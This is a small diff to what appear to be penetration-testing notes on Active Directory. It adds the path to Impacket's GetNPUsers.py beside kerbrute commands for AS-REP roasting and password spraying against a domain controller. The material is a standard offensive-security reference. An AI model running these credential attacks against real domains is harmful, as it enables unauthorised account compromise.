@@ -10,6 +10,9 @@ kerbrute asreproast -d domain.local usernames.txt --dc 192.168.1.1              
 kerbrute passwordspray -d domain.local --dc 192.168.1.1 usernames.txt passwords.txt  (Password brute forcing)
 
 
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py
+
+
 ------------------------------------------------------------------------------------------------------------------
 
 🔥 Real-World Example Flow
